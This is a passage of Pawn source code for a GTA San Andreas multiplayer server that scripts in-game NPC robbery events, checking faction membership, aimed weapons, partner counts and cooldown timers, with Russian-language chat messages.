                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[2] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",2);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 0, ActorsRob[2]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 2, 0);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,295.4810,-40.2167,1001.5156) && RobInts[i] == 1)
		{
            if(cdrob[3] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 5: pl[3][5]++;
					case 6: pl[3][6]++;
					case 14: pl[3][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[1]) continue;
                	new PW = GetPlayerWeapon(i);
                    if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[3][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[3] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",3);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 1, ActorsRob[1]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 3, 1);
                        }
						else if(pl[3][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[3] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",3);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 1, ActorsRob[1]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 3, 1);
                        }
						else if(pl[3][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[3] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",3);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 1, ActorsRob[1]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 3, 1);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,296.8526,-82.5276,1001.5156) && RobInts[i] == 2)
		{
            if(cdrob[4] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 5: pl[4][5]++;
					case 6: pl[4][6]++;
					case 14: pl[4][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[0]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[4][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[4] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",4);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 2, ActorsRob[0]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 4, 2);
                        }
						else if(pl[4][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[4] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",4);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 2, ActorsRob[0]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 4, 2);
                        }
						else if(pl[4][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[4] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",4);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 1, PlayerInfo[i][pMember], 2, ActorsRob[0]);
                            wantedsrobfriend(PlayerInfo[i][pMember], 4, 2);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && RobInts[i] == 5) // [Bikers] - Medic SF
		{
            if(cdrob[5] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 24: pl[5][5]++;
					case 26: pl[5][6]++;
					case 29: pl[5][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[5]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[5][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[5] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",5);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 5, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 5, 5);
                        }
						else if(pl[5][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[5] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",5);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 5, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 5, 5);
                        }
						else if(pl[5][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[5] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",5);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 5, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 5, 5);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && RobInts[i] == 6) // [Bikers] - Medic LS
		{
            if(cdrob[6] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 24: pl[6][5]++;
					case 26: pl[6][6]++;
					case 29: pl[6][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[6]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[6][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[6] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",6);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 6, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 6, 6);
                        }
						else if(pl[6][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[6] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",6);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 6, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 6, 6);
                        }
						else if(pl[6][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[6] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",6);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 6, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 6, 6);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && RobInts[i] == 7) // [Bikers] - Medic LV
		{
            if(cdrob[7] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 24: pl[7][5]++;
					case 26: pl[7][6]++;
					case 29: pl[7][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[7]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[7][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[7] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",7);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 7, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 7, 7);
                        }
						else if(pl[7][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[7] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",7);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 7, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 7, 7);
                        }
						else if(pl[7][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[7] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",7);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 7, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 7, 7);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && RobInts[i] == 8) // [Bikers] - Medic FC
		{
            if(cdrob[8] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 24: pl[8][5]++;
					case 26: pl[8][6]++;
					case 29: pl[8][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[8]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[8][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[8] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",8);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 8, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 8, 8);
                        }
						else if(pl[8][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[8] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",8);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 8, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 8, 8);
                        }
						else if(pl[8][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[8] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",8);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 8, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 8, 8);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
		else if(PlayerToPoint(30,i,298.4895,180.3188,1214.7949) && RobInts[i] == 9) // [Bikers] - Medic LS Ghetto
		{
            if(cdrob[9] == false)
            {
            	switch(PlayerInfo[i][pMember])
            	{
					case 24: pl[9][5]++;
					case 26: pl[9][6]++;
					case 29: pl[9][7]++;
					default: continue;
            	}
		    	new PTA = GetPlayerCameraTargetActor(i),
		    		keys,
					updown,
					leftright;
                GetPlayerKeys(i, keys, updown, leftright);
    	    	if(PTA != INVALID_ACTOR_ID && keys & KEY_AIM)
    	    	{
                    if(PTA != ActorsRob[9]) continue;
                	new PW = GetPlayerWeapon(i);
                	if(PW == 23 || PW == 24 || PW == 25 || PW == 29 || PW == 30 || PW == 31 || PW == 32)
                	{
						if(pl[9][5] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[9] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",9);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 9, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 9, 9);
                        }
						else if(pl[9][6] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[9] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",9);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 9, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 9, 9);
                        }
						else if(pl[9][7] > 1)
						{
                        	ApplyActorAnimation(PTA, "SHOP", "SHP_HandsUp_Scr",4.1,0,0,0,1,0);
                            cdrob[9] = true;
                            SetTimerEx("RobsEnabledCD", 1800000, false, "d",9);
                            RobTickRTC[i] = 30;
                            robscdtimer[i] = SetTimerEx("RobTickRTSC", 1000, true, "ddddi", i, 2, PlayerInfo[i][pMember], 9, PTA);
                            wantedsrobfriend(PlayerInfo[i][pMember], 9, 9);
                        }
                        else
                        {
                        	SendClientMessage(i, COLOR_GREY, " Для начала ограбления нужно минимум 2 напарника");
                        }
                	}
            	}
            }
            continue;
		}
	}
}
